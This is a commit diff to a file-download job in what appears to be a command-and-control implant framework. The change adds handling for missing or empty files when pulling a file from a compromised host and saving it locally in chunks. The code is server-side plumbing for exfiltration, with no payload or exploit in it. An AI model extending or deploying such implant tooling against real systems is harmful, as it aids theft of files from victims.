better handling on nonexistent files

+++ modules/implant/util/download_file.py
@@ -43,41 +43,46 @@ class DownloadFileImplant(core.implant.Implant):
 
 class DownloadFileJob(core.job.Job):
     def report(self, handler, data, sanitize = False):
-        self.save_fname = self.options.get("LPATH") + "/" + self.options.get("RFILE").split("\\")[-1]
-        self.save_fname = self.save_fname.replace("//", "/")
+        status = handler.get_header("Status", False)
+        if status == "NotExist":
+            self.notexist = True
 
-        while os.path.isfile(self.save_fname):
-            self.save_fname += "."+uuid.uuid4().hex
+        if not status:
+            self.save_fname = self.options.get("LPATH") + "/" + self.options.get("RFILE").split("\\")[-1]
+            self.save_fname = self.save_fname.replace("//", "/")
 
-        i = 0
-        step = int(self.options.get("CHUNKSIZE"))
-        partfiles = []
-        while i < len(data):
-            with open(self.save_fname+str(i), "wb") as f:
-                partfiles.append(self.save_fname+str(i))
-                end = i+step
-                if end > len(data):
-                    end = len(data)
-                while True:
+            while os.path.isfile(self.save_fname):
+                self.save_fname += "."+uuid.uuid4().hex
+
+            i = 0
+            step = int(self.options.get("CHUNKSIZE"))
+            partfiles = []
+            while i < len(data):
+                with open(self.save_fname+str(i), "wb") as f:
+                    partfiles.append(self.save_fname+str(i))
+                    end = i+step
+                    if end > len(data):
+                        end = len(data)
+                    while True:
+                        try:
+                            pdata = self.decode_downloaded_data(data[i:end], handler.get_header("encoder", "1252"))
+                        except:
+                            end -= 1
+                            continue
+                        break
                     try:
-                        pdata = self.decode_downloaded_data(data[i:end], handler.get_header("encoder", "1252"))
+                        # if the data is just a text file, we want to decode correctly and then re-encode
+                        pdata = pdata.decode('cp'+handler.get_header("encoder", "1252")).encode()
                     except:
-                        end -= 1
-                        continue
-                    break
-                try:
-                    # if the data is just a text file, we want to decode correctly and then re-encode
-                    pdata = pdata.decode('cp'+handler.get_header("encoder", "1252")).encode()
-                except:
-                    pass
-                f.write(pdata)
-            i += end
+                        pass
+                    f.write(pdata)
+                i += end
 
-        with open(self.save_fname, "wb+") as f:
-            for p in partfiles:
-                f.write(open(p, "rb").read())
-                os.remove(p)
-        self.save_len = len(data)
+            with open(self.save_fname, "wb+") as f:
+                for p in partfiles:
+                    f.write(open(p, "rb").read())
+                    os.remove(p)
+            self.save_len = len(data)
 
         # with open(self.save_fname, "wb") as f:
         #     data = self.decode_downloaded_data(data, handler.get_header("encoder", "1252"))
@@ -88,13 +93,24 @@ class DownloadFileJob(core.job.Job):
         #         pass
         #     f.write(data)
         #     self.save_len = len(data)
-
-        super(DownloadFileJob, self).report(handler, data, False)
+            try:
+                if self.notexist:
+                    self.error(0, "%s does not exist" % (self.options.get("RFILE")), "FileNotExist", "")
+                    self.results = "%s does not exist" % (self.options.get("RFILE"))
+            except:
+                super(DownloadFileJob, self).report(handler, data, False)
+        handler.reply(200)
 
     def done(self):
         rfile = self.options.get("RFILE")
+        if self.save_len == 0:
+            self.print_warning("The file is empty")
         self.results = "%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len)
         self.display()
 
     def display(self):
-        self.shell.print_good(self.results)
+        try:
+            if self.notexist:
+                self.shell.print_error(self.results)
+        except:
+            self.shell.print_good(self.results)
